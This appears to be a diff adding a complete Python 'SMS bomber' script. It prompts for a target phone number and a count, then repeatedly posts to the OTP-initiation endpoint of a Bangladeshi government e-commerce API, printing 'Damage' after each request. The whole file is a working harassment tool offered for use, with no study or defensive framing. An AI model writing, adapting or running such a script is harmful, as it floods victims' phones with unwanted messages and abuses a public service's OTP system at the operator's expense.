@@ -1,0 +1,17 @@
+import requests
+from requests.structures import CaseInsensitiveDict
+
+number=str(input("[>] Enter Your Target Number:"))
+
+url = "https://api.ekshop.gov.bd:3001/api/initotp"
+
+amount = int(input ("[>] Enter Your Target Amount:"))
+
+headers = CaseInsensitiveDict()
+headers["Content-Type"] = "application/json"
+
+data = """{\"phone_number\":\""""+number+"""\",\"country_code\":\"+88\",\"phone\":\"01819400400\"}"""
+
+for i in range (amount):
+    resp = requests.post(url, headers=headers, data = data)
+    print(str (i+1)+" Damage \n")
